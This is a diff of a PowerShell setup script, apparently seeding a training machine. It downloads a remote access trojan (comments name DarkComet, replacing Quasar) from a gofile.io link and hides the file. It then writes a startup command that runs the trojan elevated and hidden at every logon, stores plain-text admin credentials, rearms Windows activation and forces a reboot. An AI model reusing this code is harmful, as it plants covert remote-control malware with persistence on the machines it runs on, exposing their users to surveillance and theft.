@@ -10,7 +10,7 @@ param(
 )
 
 $raturl = "https://gofile.io/d/VHmBL1"
-$startup = "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.cmd"
+$startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.cmd"
 
 $temppwd = ConvertTo-SecureString -String $defAdminPwd -AsPlainText -Force
 $localcred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $defAdminUsr,$temppwd
@@ -26,20 +26,14 @@ Invoke-WebRequest -uri $raturl -OutFile $localpath
 $hideFile = get-item $localpath -Force
 $hideFile.attributes = "Hidden"
 
-#Invoke-WebRequest -uri "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.cmd" -OutFile 
-
 "powershell -c start -verb runas $localpath -windowstyle hidden" | out-file -filepath $startup
-Start-Process powershell.exe -argumentlist "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.ps1" -credential $localcred
 
-
-# https://github.com/cybermias/publicrep/raw/master/guacconf/Python.37.svchost.exe
-# c:\users\cmtsadmin\searches\python37.svchost.exe 
-
-Start-Process powershell.exe -verb runas -ArgumentList "start-process -filepath $localpath -Credential $localcred"
-
+# https://github.com/cybermias/publicrep/raw/master/guacconf/Python.37.svchost.exe <== OLD Quasar
+# Moved to Dark Commet https://gofile.io/d/VHmBL1
+# c:\users\cmtsadmin\searches\python37x.exe 
+cmd /c 'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\" /v "PagingFiles" /t REG_MULTI_SZ /d "D:\pagefile.sys 0 0" /f'
 
 
 cscript c:\windows\system32\slmgr.vbs /rearm
-REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\" /v "PagingFiles" /t REG_MULTI_SZ /d "D:\pagefile.sys 0 0" /f
 
 shutdown /r /t 03
